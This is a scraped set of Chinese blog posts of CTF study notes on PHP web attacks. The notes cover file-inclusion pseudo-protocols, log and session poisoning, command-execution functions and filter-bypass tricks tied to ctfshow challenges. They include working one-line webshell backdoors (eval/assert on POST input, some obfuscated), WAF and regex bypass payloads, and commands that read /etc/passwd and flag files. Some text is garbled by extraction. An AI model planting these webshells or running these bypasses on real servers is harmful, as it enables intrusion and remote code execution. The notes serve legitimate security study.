</ol>
<p>重要名称定义：</p>
<p>URI（Uniform Resource Identifier）:统一资源标识符,服务器资源名被称为统一资源标识符。</p>
<p>URL（Uniform Resource Locator）:统一资源定位符，描述了一台特定服务器上某资源的特定位置。</p>
<p>URN（Uniform Resource Name）:统一资源名称</p>
<ul>
<li>php://input</li>
</ul>
<p>用于执行 POST 数据,也可认为是一个文件POST数据是内容，常用于rce中</p>
<p>enctype=”multipart/form-data” 的时候 php://input 是⽆效的 </p>
<p>说明: </p>
<ul>
<li><p>需要开启allow_url_include </p>
</li>
<li><p>php://input 读⼊请求的POST数据并且执⾏ </p>
</li>
<li><p>表单确定类别 enctype=”multipart/form-data” ⽆法读取⽆法执⾏ </p>
</li>
</ul>
<p>zip://&amp;bzip2://&amp;zlib:// </p>
<ul>
<li><p>allow_url_fopen :offff/on </p>
</li>
<li><p>allow_url_include :offff/on </p>
</li>
</ul>
<p>压缩流 </p>
<ul>
<li><p>compress.zlib://file.gz </p>
</li>
<li><p> compress.bzip2://file.bz2 </p>
</li>
<li><p>zip://archive.zip#dir/file.txt </p>
</li>
</ul>
<p>作⽤： zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩⽂件中的⼦⽂件， </p>
<p>更重要的是不需要指定后缀名，可修改为任意后缀： jpg png gif xxx 等等。 </p>
<p>主要⽤⽂件包含中上传本地⼀句话⽂件，利⽤include执⾏ </p>
<p>具体细节：</p>
<p>file:// </p>
<p>⽤于访问本地⽂件系统，在CTF中通常⽤来读取本地⽂件的且不受allow_url_fopen与 </p>
<p>allow_url_include的影响 </p>
<p>http:// https://条件： </p>
<ul>
<li><p>allow_url_fopen :on </p>
</li>
<li><p>allow_url_include :on </p>
</li>
</ul>
<p>作⽤：常规 URL 形式，允许通过 HTTP 1.0 的 GET⽅法，以只读访问⽂件或资 </p>
<p>源。CTF中通常⽤于远程包含。 </p>
<p>示例： </p>
<p>1 ?file=<a target="_blank" rel="noopener" href="http://127.0.0.1/phpinfo.txt">http://127.0.0.1/phpinfo.txt</a> </p>
<p>phar:// </p>
<p>有些waf不会防php后缀的⽂件，但是他会检测⾥⾯的内容，我们可以通过包含的⽅式，</p>
<p>包含rar后缀或者phar后缀⾥⾯的txt⽂件或者jpg⽂件达到绕过防护的⽬的 </p>
<p>test.php </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/24/web6/" data-id="ckysoi0xr0000hov35vghfto0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web5" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/23/web5/" class="article-date">
  <time datetime="2022-01-23T11:09:52.149Z" itemprop="datePublished">2022-01-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><h3 id="⽂件包含"><a href="#⽂件包含" class="headerlink" title="⽂件包含:"></a>⽂件包含:</h3><p>宗旨: </p>
<p>将任何的php⽂件或者⾮php⽂件利⽤函数包含进php⽂件之后都会被当作php代码解析 </p>
<p>PHP提供⼀些函数来进⾏各个⽂件之间的相互引⽤，并提供了⼀些协议⽤于读取或者写⼊⽂件 </p>
<p>特殊⽂件包含: </p>
<p>最常⻅的使⽤: </p>
<p>include(‘flag.php’) 包含 flag.php ⽂件 </p>
<p>其他函数： </p>
<p>include、require、include_once、require_once、 </p>
<p>highlight_fifile、show_source、fifile_get_contents、fopen、fifile、readfifil</p>
<h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>相关配置 </p>
<p>本地⽂件包含 (LFI)：可以读取与打开本地⽂件 </p>
<p>远程⽂件包含 (RFI)(HTTP,FTP,PHP伪协议)：可以远程加载⽂件 </p>
<ul>
<li>本地⽂件包含：通过浏览器包含web服务器上的⽂件，这种漏洞是因为浏览器包含 </li>
</ul>
<p>⽂件时没有进⾏严格的过滤允许遍历⽬录的字符注⼊浏览器并执⾏ </p>
<ul>
<li>远程⽂件包含：就是允许攻击者包含⼀个远程的⽂件,⼀般是在远程服务器上预先设 </li>
</ul>
<p>置好的脚本。 此漏洞是因为浏览器对⽤户的输⼊没有进⾏检查，导致不同程度的信</p>
<p>息泄露、拒绝服务攻击 甚⾄在⽬标服务器上执⾏代码 </p>
<h5 id="1-包含⼀句话⽊⻢"><a href="#1-包含⼀句话⽊⻢" class="headerlink" title="1.包含⼀句话⽊⻢:"></a>1.包含⼀句话⽊⻢:</h5><p>将⼀句话写在⼀个⽂件中上传之后，在可以包含⽂件的php⻚⾯包含该⽂件，直接利⽤⼀句话 </p>
<p>常⻅的⼀句话 </p>
<p>eval : </p>
<ul>
<li><p>⽤来执⾏任意php代码 </p>
</li>
<li><p> ⽤法</p>
</li>
</ul>
<p>例：&lt;?php </p>
<p>eval($_POST[1]); </p>
<p> //1=system(ls); </p>
<p> ?&gt; </p>
<ul>
<li><p>最常⻅的⽊⻢: </p>
</li>
<li><p>防爆破⽊⻢:  </p>
<?php 

substr(md5($_REQUEST['x']),28)=='6862'&&eval($_REQUEST['password']); 

 ?><p>x=myh0st </p>
</li>
<li><p>过狗⼀句话: </p>
</li>
<li><p>不⽤ ? 的⼀句话：<script language="php">eval ($_POST[hihack]);</script> </p>
</li>
<li><p>不⽤eval的⼀句话: </p>
</li>
<li><p>变形⼀句话后⻔: </p>
</li>
<li><p> 灭杀⼀句话：<!--?php $x="as"."se"."rt";$x($_POST["pass"]);?--> </p>
</li>
</ul>
<h5 id="2-直接包含敏感⽂件"><a href="#2-直接包含敏感⽂件" class="headerlink" title="2.直接包含敏感⽂件"></a>2.直接包含敏感⽂件</h5><ul>
<li>404⻚⾯: </li>
</ul>
<p>  随便找⼀个不存在的⻚⾯显示出404之后，就可以看到服务器的类型 </p>
<ul>
<li><p>右键检查抓包: </p>
<p>点击 network 之后刷新⼀下</p>
</li>
</ul>
<h5 id="2-1-包含⽇志⽂件"><a href="#2-1-包含⽇志⽂件" class="headerlink" title="2.1 包含⽇志⽂件"></a>2.1 包含⽇志⽂件</h5><ul>
<li>nginx服务器下⽇志⽂件的路径: </li>
</ul>
<p>  1 /var/log/nginx/access.log </p>
<p>  2 /var/log/nginx/error.log</p>
<ul>
<li>apache服务器下的⽇志⽂件路径: </li>
</ul>
<p>   /etc/httpd/logs/access_log </p>
<p>  或者</p>
<p>   /var/log/httpd/access_log </p>
<p>  /var/log/apache2/error.log //错日志存放</p>
<p>   自定义文件路径:/etc/apache2/apache2.conf //查找以 ErrorLog 开头的行</p>
<p>  注意：nginx ⽇志⽂件在⽤户安装⽬录的logs⽬录下 </p>
<p>  如安装⽬录为/usr/local/nginx,则⽇志⽬录就是在/usr/local/nginx/logs⾥ </p>
<p>  也可通过其配置⽂件Nginx.conf，获取到⽇志的存在路径 </p>
<p>  （</p>
<p>  /opt/nginx/logs/access.log</p>
<p>  利⽤ hackbar 原本的user-Agent信息被注⼊了⼀句话，在包含⽇志⽂件的时候，⼀句话被执 </p>
<p>  ⾏，最后在⽇志信息中替换成执⾏后的结果，原本 access.log 是不会执⾏⼀句话的， </p>
<p>  但是被包含进 .php ⻚⾯之后就会以php的⽅式执⾏，我们刚好传⼊⼀句php代码,因此被执 ⾏</p>
<h5 id="2-2-包含-session⽂件-⽆后缀⽂件"><a href="#2-2-包含-session⽂件-⽆后缀⽂件" class="headerlink" title="2.2 包含 session⽂件(⽆后缀⽂件)"></a>2.2 包含 session⽂件(⽆后缀⽂件)</h5><ul>
<li><p>获取session位置存放信息</p>
</li>
<li><p>利⽤docker跑起来</p>
<p>session工作原理:</p>
<ul>
<li><p>⾸先使⽤session_start() 函数进⾏初始化 </p>
</li>
<li><p>当执⾏PHP脚本时，通过使⽤$_ SESSION 超全局变量注册 session变量 </p>
</li>
<li><p>当 P H P 脚 本 执 ⾏ 结 束 时 ， 未 被 销 毁 的 s e s s i o n 变 量 会 被 ⾃ 动 保 存 在 </p>
</li>
</ul>
<p>本 地 ⼀ 定 路 径 下的session库 中 ， 这 个 路 径 可 以 通 过 php.ini ⽂ 件 中 的 session.savepath 指 定 ， 下 次 浏 览 ⽹ ⻚ 时 可 以 加 载 使 ⽤ . session _start( )做 了 哪 些 初 始 化 工 作 ：</p>
<ul>
<li><p> 读取名为 PHPSESSID ( 如 果 没 有 改 变 默 认 值 ) 的 cookie值,假使为 abc123 </p>
</li>
<li><p>若 读 取 到 PHPSESSID这个COOKIE ， 创 建 SESSION 变 量 ， 并 从 相 应 的 ⽬ 录 中 （ 可 以 在 p h p . i n i 中 设 置 ） 读 取 SESS_abc123（ 默 认 是 这 种 命 名 ⽅ 式 ） ⽂ 件 , 将 字 符 装 在 ⼊ SESSION 变量中 ; 若 没 有 读 取 到 PHPSESSID 这 个 COOKIE ， 也 会 创 建 $_SESSION 超全局变量注册 session 变量。 </p>
</li>
</ul>
<p>（3）当PHP脚本执⾏结束时，未被销毁的session变量会被⾃动保存在本地⼀定路径下的 </p>
<p>session库中， 这个路径可以通过php.ini⽂件中的session.save_path 指定，下次浏览⽹⻚ 时可以加载使⽤。 </p>
<p>漏洞分析： 此php会将获取到的GET型ctfs变量的值存⼊到session⽬录下存储session的值。session的⽂件 </p>
<p>名为sess+sessionid，sessionid可以通过开发者模式获取。</p>
<ul>
<li><p> 默认路径没有值,说明session的保存路径在/tmp/⽬录下，进⼊容器看⼀下</p>
</li>
<li><p>这⾥出现警导致下⾯的程序是⽆法执⾏的，这个警告说的是请求可以到达，但⽆法打开 </p>
<p>session，只需要将session_start();放在 hilighlight_file 前边即可 </p>
<p>接下来修改PHPSESSID为aaa传参数 ?ctfs=ctfs</p>
<p>查看session文件</p>
<ul>
<li>如果当前⻚⾯存在⽂件包含漏洞，那么我们可以直接包含这个⽂件，进⽽执⾏php代码 </li>
</ul>
<p>相关题⽬: </p>
<p>ctfshow-web82-85</p>
</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/23/web5/" data-id="ckyr8cjj70000w8v3cuq206th" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web4" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/22/web4/" class="article-date">
  <time datetime="2022-01-22T10:56:53.115Z" itemprop="datePublished">2022-01-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><h3 id="常见的绕过姿势"><a href="#常见的绕过姿势" class="headerlink" title="常见的绕过姿势"></a>常见的绕过姿势</h3><h5 id="2-7-11-FFI扩展-PHP-gt-7-4-0"><a href="#2-7-11-FFI扩展-PHP-gt-7-4-0" class="headerlink" title="2.7.11 FFI扩展(PHP&gt;7.4.0)"></a>2.7.11 FFI扩展(PHP&gt;7.4.0)</h5><p>这⼀扩展可以让PHP语⾔中使⽤C语⾔中的函数和库 </p>
<p>FFI链接 </p>
<p>常⻅调⽤⽅式: </p>
<ul>
<li><p>FFI::def </p>
</li>
<li></li>
</ul>
<p>创建FFI对象,⼀个字符串，包含常规C语⾔中的⼀系列声明（类型、结构、函数、变量等）。实 </p>
<p>际上，这个字符串可能是从C头⽂件复制粘贴的。 </p>
<p> $ffi=FFI::cdef(“int system(const char *command);”); </p>
<p> $a = ‘/readflag &gt; /var/www/html/1.txt’; </p>
<p>$ffi-&gt;system($a);exit(); </p>
<p>这段代码⾸先创建了⼀个新的 FFI 对象调⽤ Linux 库的 int system(const char* command);函 </p>
<p>数，作⽤是把 command 指定的命令名称或程序名称传给要被命令处理器执⾏的主机环境，并 </p>
<p>在命令完成后返回。 </p>
<ul>
<li>FFi::load </li>
</ul>
<p>加载C⽂件 </p>
<ul>
<li>FFi::scope </li>
</ul>
<p>使⽤预加载期间解析的C声明实例化FFI对象 </p>
<ul>
<li>FFi::new </li>
</ul>
<p>创建⼀个C语⾔数据结构 </p>
<ul>
<li>FFi::cast </li>
</ul>
<p>执⾏C类型转换 </p>
<ul>
<li>FFi::memcmp </li>
</ul>
<p>⽐较内存区域的⼤⼩字节 </p>
<ul>
<li>FFI::memcpy </li>
</ul>
<p>复制⼀个内存区域到另⼀个内存区域public static </p>
<h5 id="2-7-12-特定函数绕过"><a href="#2-7-12-特定函数绕过" class="headerlink" title="2.7.12 特定函数绕过"></a>2.7.12 特定函数绕过</h5><ul>
<li><p>parse_url </p>
<p>作用：parse_url — 解析 URL，返回其组成部分</p>
<p>mixed parse_url ( string $url [, int $component = -1 ] )<br>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p>
<p>参数：<br>url：要解析的 URL。无效字符将使用 _ 来替换。</p>
<ul>
<li><p>call_user_func </p>
<ol>
<li><p>调⽤类⾥⾯的静态函数</p>
</li>
<li><p>不区分⼤⼩写 </p>
<p>相关题⽬ </p>
<p>1 web415 </p>
<ul>
<li>preg_match绕过： </li>
</ul>
<ol>
<li>不会匹配换⾏符 </li>
</ol>
 <?php 

preg_match('/^*.(flag).*$/',$cmd){ 

 echo hacker; 

 } 

//令$cmd=\nflag 

 ?></li>
</ol>
</li>
</ul>
</li>
</ul>
<p>在⾮多⾏模式下,$会忽略掉句尾的%0a </p>
<p>PHP利⽤PCRE回溯次数绕过限制 </p>
<p>正则匹配中的某些字符对于被匹配字符串出现可匹配也可不匹配的情况，那么先不匹配，让下⼀ </p>
<p>个正则表达式的字符去匹配，如果⽆法匹配则让该字符匹配字符串称为⼀次回溯，但正则匹配有 </p>
<p>回溯次数的限制，⼀般利⽤脚本提交10000个字符差不多可以超过回溯次数绕过正则</p>
<ol start="3">
<li>⽆字⺟数字的webshell </li>
</ol>
<ul>
<li>fifilter_var </li>
</ul>
<p>使⽤特定的过滤器过滤⼀个变量 </p>
<p>php fifilter参考⼿册 </p>
<p>FILTER_VALIDATE_URL:(web406) </p>
<p>http/https协议不⽀持后⾯带有符号，所以我们绕过这个函数的时候⼀般选择任何其他协议不选 </p>
<p>择http，其他协议⽀持符号，我们便可以构造⾃⼰的 sql 语句等</p>
<ul>
<li>注意: 这⾥有了 ; 前边不能是http和https协议，可以是其他协议，url并不只有http， </li>
</ul>
<p>相关题⽬:1 ctfshow web406-408 </p>
<p>FILTER_VALIDATE_EMAIL(web408) </p>
<p>检查变量是否属于 EMAIL 格式 </p>
<p>绕过: </p>
<p>⾮法字符放在””可以绕过检测  </p>
<ul>
<li><p>playload</p>
<p>“&lt;&gt;=system($_POST[1]);?&gt;”@1.php    //非法字符放在””里面可以绕过检测</p>
<p>FILTER_VALIDATE_BOOLEAN </p>
<p>把值作为布尔选项来验证。如果是 “1”、”true”、”on” 和 “yes”，则返回 TRUE。如果是 </p>
<p>“0”、”false”、”off”、”no” 和 “”，则返回 FALSE。否则返回 NULL。 </p>
<ul>
<li>过滤了1和true可以⽤on和yes绕过 </li>
</ul>
</li>
</ul>
<h5 id="2-7-13-语法绕过"><a href="#2-7-13-语法绕过" class="headerlink" title="2.7.13 语法绕过"></a>2.7.13 语法绕过</h5><ol>
<li>提前闭合源⽂件 </li>
</ol>
<p>?&gt; 提前闭合源⽂件的 <?php ,之后再新创 <?php?></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/22/web4/" data-id="ckyprsea700008cv3f2n28xud" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/21/web3/" class="article-date">
  <time datetime="2022-01-21T06:59:57.484Z" itemprop="datePublished">2022-01-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><h3 id="常见的绕过姿势"><a href="#常见的绕过姿势" class="headerlink" title="常见的绕过姿势"></a>常见的绕过姿势</h3><h5 id="2-7-6-系统命令构造数字"><a href="#2-7-6-系统命令构造数字" class="headerlink" title="2.7.6 系统命令构造数字:"></a>2.7.6 系统命令构造数字:</h5><p>{_} = “” </p>
<p> $(())=0 </p>
<p> $((~$(())))=-1</p>
<p>相关题⽬: </p>
<p>ctfshow-web57</p>
<h5 id="2-7-7-服务器变量构造查询语句"><a href="#2-7-7-服务器变量构造查询语句" class="headerlink" title="2.7.7.服务器变量构造查询语句"></a>2.7.7.服务器变量构造查询语句</h5><ul>
<li>常⻅的系统变量: </li>
</ul>
<p>1.系统变量 </p>
<p>相关题⽬:web119 </p>
<p>2.构建tac </p>
<p>tac====&gt;${PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:<del>A}:</del>${SHLVL}}:${PHP_VERS </p>
<p>ION:${PHP_VERSION:<del>A}:</del>${SHLVL}}} </p>
<p>⾸先获取到3以便于得到 PHP_CFLAGS 中的tac: </p>
<p>从 PHP_VERSION 中截取 ${PHP_VERSION:2:1} //切⽚操作 </p>
<p>这⾥的2: 可以⽤ ${PHP_VERSION:~A} 得到字符串的最后⼀位 </p>
<p>这⾥的1: 可以⽤ ${<del>SHLVL} 得到，因为按位取反10取反得到01所以 ～2=1 ； 因此: 3=${PHP_VERSION:${PHP_VERSION:</del>A}:<del>${SHLVL}} 最终的tac命令： a. ${PHP_CFLAGS:3:3} //切⽚操作,也就是上⾯3的语句直接复制⼀遍 也就是{PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:</del>A}:${<del>SHLVL}}:${PHP_VERSION:${PHP_VERSION:</del>A}:~${SHLVL}}} //得到tac指令 </p>
<p>3.构建base64: </p>
<h5 id="2-7-8-以数字和不敏感函数构造敏感函数"><a href="#2-7-8-以数字和不敏感函数构造敏感函数" class="headerlink" title="2.7.8 以数字和不敏感函数构造敏感函数"></a>2.7.8 以数字和不敏感函数构造敏感函数</h5><p>base_convert(1231231131,10,36) ===&gt;hex2bin </p>
<p> hex2bin(dechex(1598506324))=======&gt;_GET </p>
<p>3$hex2bin(dechex(1598506324))=======&gt;$_GET </p>
<p>相关题⽬: </p>
<p>ctfshow-web124 </p>
<h5 id="2-7-9open-basedir-绕过"><a href="#2-7-9open-basedir-绕过" class="headerlink" title="2.7.9open_basedir()绕过"></a>2.7.9open_basedir()绕过</h5><ul>
<li>传脚本绕过: </li>
</ul>
<p>直接把脚本当作参数传⼊，最后⼀⾏是执⾏的命令 </p>
<p>相关题⽬:ctfshow-web72 </p>
<ul>
<li><p>ini_set(‘open_basedir’,’/‘); </p>
</li>
<li><p>系统命令不受open_basedir的限制 </p>
</li>
</ul>
<p>1 &lt;?php </p>
<p>2 ini_set(‘open_basedir’,’/var/www/html’); </p>
<p>3 $a = eval(system(‘tac /flag.txt’)); //仍然可以执行</p>
<p>4 ?&gt; </p>
<ul>
<li>⼀些其他伪协议不受 open_basedir 的限制==&gt;⽂件包含讲解 </li>
</ul>
<h5 id="2-7-10-⽆数字字符绕过"><a href="#2-7-10-⽆数字字符绕过" class="headerlink" title="2.7.10.⽆数字字符绕过"></a>2.7.10.⽆数字字符绕过</h5><ol>
<li>构造POST数据包 </li>
</ol>
<p>通过构造数据包，向⽬标服务器发送⽂件，⽂件已被保存到tmp⽬录下再根据保存的⽂件名的特 </p>
<p>性(最后⼀个字⺟为⼤写)，筛选⽂件，利⽤ .</p>
<p>解题思路:</p>
<ul>
<li><p>构造post数据包上传文件，linux系统下会保存在/tmp/php???</p>
</li>
<li><p>抓包，使文件中包含sh’命令</p>
</li>
<li><p>利用.执行</p>
<p>注意: </p>
<p>1 tmp目录下文件比较多，我们所上传的文件最后一个字母是大写，因此利用ascii字母的大写匹</p>
<p>配，过滤掉其他文件[@-[]</p>
<p>⽆字⺟绕过正则 </p>
<p>通过汉字或者⼀些不可⻅字符，进⾏异或，求与，取反等操作构建字⺟从⽽构建命令，最后显示 </p>
<p>的结果是经过url编码的 </p>
<p>脚本的说明: </p>
<ul>
<li> ⽣成字符表脚本 </li>
<li> 利⽤字符表⽣成我们需要的命令 </li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/21/web3/" data-id="ckyocew810000c8v3e9v35ghy" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/20/web2/" class="article-date">
  <time datetime="2022-01-20T10:57:59.170Z" itemprop="datePublished">2022-01-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><h3 id="2-6-正则-安全的⼀道重要防线"><a href="#2-6-正则-安全的⼀道重要防线" class="headerlink" title="2.6 正则(安全的⼀道重要防线)"></a>2.6 正则(安全的⼀道重要防线)</h3><p>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<p>正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<h3 id="2-7-常⻅的绕过姿势"><a href="#2-7-常⻅的绕过姿势" class="headerlink" title="2.7 常⻅的绕过姿势"></a>2.7 常⻅的绕过姿势</h3><h5 id="2-7-1常⽤符号"><a href="#2-7-1常⽤符号" class="headerlink" title="2.7.1常⽤符号"></a>2.7.1常⽤符号</h5><ul>
<li>命令连接符 </li>
</ul>
<p>Windows和Linux都⽀持的命令连接符：</p>
<p>cmd1 | cmd2 只执行cmd2 </p>
<p>cmd1 || cmd2 只有cmd1执行失败后，cmd2才被执行</p>
<p>cmd1 &amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2 </p>
<p>cmd1 &amp;&amp; cmd2 先执行cmd1，只有cmd1执行成功后才执行cmd2，否则不执行cmd2  </p>
<ul>
<li><p>通配符 </p>
</li>
<li><p>? #单个字符</p>
<p>2 * #零个、单个或多个字符</p>
<h5 id="2-7-2-cat-绕过"><a href="#2-7-2-cat-绕过" class="headerlink" title="2.7.2  cat 绕过"></a>2.7.2  cat 绕过</h5><p>(1)more:一页一页的显示档案内容</p>
<p> (2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</p>
<p> (3)head:查看头几行</p>
<p> (4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>
<p> (5)tail:查看尾几行</p>
<p> (6)nl：显示的时候，顺便输出行号</p>
<p>(7)od:以二进制的方式读取档案内容</p>
</li>
</ul>
<p>vi,vim,sort,uniq,file等</p>
<h5 id="2-7-3-空格绕过"><a href="#2-7-3-空格绕过" class="headerlink" title="2.7.3 空格绕过"></a>2.7.3 空格绕过</h5><ol>
<li><p>${IFS}替换</p>
</li>
<li><p>$IFS$1替换</p>
</li>
<li><p>${IFS替换</p>
</li>
</ol>
<p>${IFS}$9 </p>
<p>4.%20替换</p>
<ol start="5">
<li><p>&lt; 和 &lt;&gt; 重定向符替换</p>
</li>
<li><p>%09替换(需要php环境) </p>
</li>
<li><p>%0a %0b %0c %0d </p>
</li>
</ol>
<h5 id="2-7-4敏感字符绕过"><a href="#2-7-4敏感字符绕过" class="headerlink" title="2.7.4敏感字符绕过"></a>2.7.4敏感字符绕过</h5><ul>
<li><p>变量绕过 ; </p>
</li>
<li><p> base64 绕过 </p>
</li>
<li><p>单双引号: c””at fl’’ag </p>
</li>
<li><p> 反斜线： c\at fl\ag</p>
</li>
<li><p> 连接符：cat /etc/pass’w’d </p>
</li>
</ul>
<h5 id="2-7-5-php-include-伪协议-绕过"><a href="#2-7-5-php-include-伪协议-绕过" class="headerlink" title="2.7.5 php include + 伪协议 绕过"></a>2.7.5 php include + 伪协议 绕过</h5><p>例：\1. ?c=include $_GET[“a”] ?&gt;&amp;a=php://filter/read=convert.base64-encode/reso </p>
<p>urce=flag.php </p>
<p>伪协议相关知识请参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-an-/p/12372220.html">https://www.cnblogs.com/-an-/p/12372220.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/20/web2/" data-id="ckymwi5xy00004sv3ex3ze0i4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-web" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/01/19/web/" class="article-date">
  <time datetime="2022-01-19T07:30:12.135Z" itemprop="datePublished">2022-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web1命令执行"><a href="#web1命令执行" class="headerlink" title="web1命令执行"></a>web1命令执行</h1><h3 id="2-1-rce中常⽤的php代码执⾏函数"><a href="#2-1-rce中常⽤的php代码执⾏函数" class="headerlink" title="2.1 rce中常⽤的php代码执⾏函数"></a>2.1 rce中常⽤的php代码执⾏函数</h3><ul>
<li>eval() </li>
</ul>
<p>执⾏⼀个字符串表达式，该字符串必须是合法的 PHP 代码，且必须以 分号 结尾 </p>
<p>例： </p>
<?php 

 $a = 199; 

 eval("echo\$a;"); #输出：199 

* assert() 

assert 函数 是直接将传⼊的参数当成 PHP代码 直接，不需要以分号结尾，当然你加 上也可以 。

* preg_replace() 
* 搜索 subject 中匹配 pattern 的部分，以 replacement 进⾏替换。 preg_replace() 函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的 /e修饰符，使 preg_replace 将 replacement 参数当作 PHP 代码

* create_function() 

通过传递的参数创建⼀个匿名函数，并且返回函数的⼀个名字

* array_map() 

为数组的每个元素应⽤回调函数 

array_map()：返回数组，是为 array 每个元素应⽤ callback 函数之后的数 组。 array_map() 返回⼀个 array，数组内容为 array1 的元素按索引顺序为参数调 ⽤ callback 后的结果（有更多数组时，还会传⼊ arrays 的元素）。 callback 函数形参的数量必须匹配 array_map() 实参中数组的数量

* call_user_func()/call_user_func_array() 

call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_func_array() --------调⽤回调函数，并把⼀个数组参数作为回 调函数的参数 

* array_filter() 

使⽤回调函数过滤数组的元素

遍历 array 数组中的每个值，并将每个值传递给 callback 回调函数。 如果 callback 回调函数返回 true ，则将 array 数组中的当前值返回到结果 array 数组中 

* usort()/uasort() 

使⽤⽤户⾃定义的⽐较函数对数组中的值进⾏排序 本函数将⽤⽤户⾃定义的⽐较函数对⼀个数组中的值进⾏排序。 如果要排序的数组需要⽤⼀种不寻常的标准进⾏排序，那么应该使⽤此函数。 

* file_put_contents()/fputs() 

将⼀个字符串写⼊⽂件 

* 动态函数构造:

利⽤⽅式: 

<?php 

 a=assert&b=system('ls') 

 $_GET['a']($_GET['b']); 

 ?><h3 id="2-2-rce中常用的包含文件函数"><a href="#2-2-rce中常用的包含文件函数" class="headerlink" title="2.2 rce中常用的包含文件函数"></a>2.2 rce中常用的包含文件函数</h3><ul>
<li>include </li>
</ul>
<p>当包含 .php ⽂件时，可同时运⾏ </p>
<ul>
<li>highlight_fifile </li>
</ul>
<p>语法⾼亮⼀个⽂件，即将⽂件内容全部展示出来</p>
<ul>
<li>show_source </li>
</ul>
<p>highlight_file 的别名  </p>
<h3 id="2-3-常⻅的系统执⾏函数"><a href="#2-3-常⻅的系统执⾏函数" class="headerlink" title="2.3 常⻅的系统执⾏函数"></a>2.3 常⻅的系统执⾏函数</h3><ul>
<li>system </li>
</ul>
<p>将 字符串 作为 OS命令 去执⾏，并且 ⾃带输出功能 </p>
<p> system(string $command, int &amp;$return_var = ?): string </p>
<ul>
<li>shell_exec() </li>
</ul>
<p>通过 shell 环境执⾏命令，并且将完整的输出以字符串的⽅式返回。 只返回字符串，不会进⾏输出 该函数和 反引号 `` 的执⾏效果⼀致 </p>
<ul>
<li>exec </li>
</ul>
<p>将 字符串 作为 OS命令 去执⾏，但是⾃身 不带输出功能，需要 写⼊ 输出功能的代 码 执⾏⼀个外部程序 exec(string $command, array &amp;$output = ?, int &amp;$return_var = ?): string </p>
<p>本函数执⾏输⼊ command 的外部程序或外部指令。它的返回字符串只是外部程序执⾏后返回的最后⼀ ⾏；若需要完整的返回字符串，可以使⽤ PassThru() 这个函数。 </p>
<ul>
<li>popen </li>
</ul>
<p>打开进程⽂件指针 </p>
<p>popen(string $command , string $mode ): resource </p>
<p>打开⼀个指向进程的管道，该进程由派⽣给定的 command 命令执⾏⽽产⽣。</p>
<ul>
<li>passthru </li>
</ul>
<p>执⾏外部程序并且 ⾃带输出功能 </p>
<p>passthru(string $command , int &amp;$return_var = ?): void </p>
<p>同 exec() 函数类似， passthru() 函数 也是⽤来执⾏外部命令（ command ）的。 当 所执⾏的 Unix 命令输出⼆进制数据， 并且需要直接传送到浏览器的时候， 需要⽤此函数来替代 exec() 或 system() 函数。 常⽤来执⾏诸如 pbmplus 之类的可以直接输出图 像流的命令。 通过设置 Content-type 为 image/gif ， 然后调⽤pbmplus 程序输出 gif ⽂件， 就可以从 PHP 脚本中直接输出图像到浏览器。 </p>
<h3 id="2-4-其他命令执⾏函数"><a href="#2-4-其他命令执⾏函数" class="headerlink" title="2.4 其他命令执⾏函数"></a>2.4 其他命令执⾏函数</h3><p> PHP：exec、shell_exec、system、passthru、popen、proc_open等  ASP.NET：System.Diagnostics.Start.Process、System.Diagnostics.Start.ProcessStartInfo等 5 Java：java.lang.runtime.Runtime.getRuntime、java.lang.runtime.Runtime.exec </p>
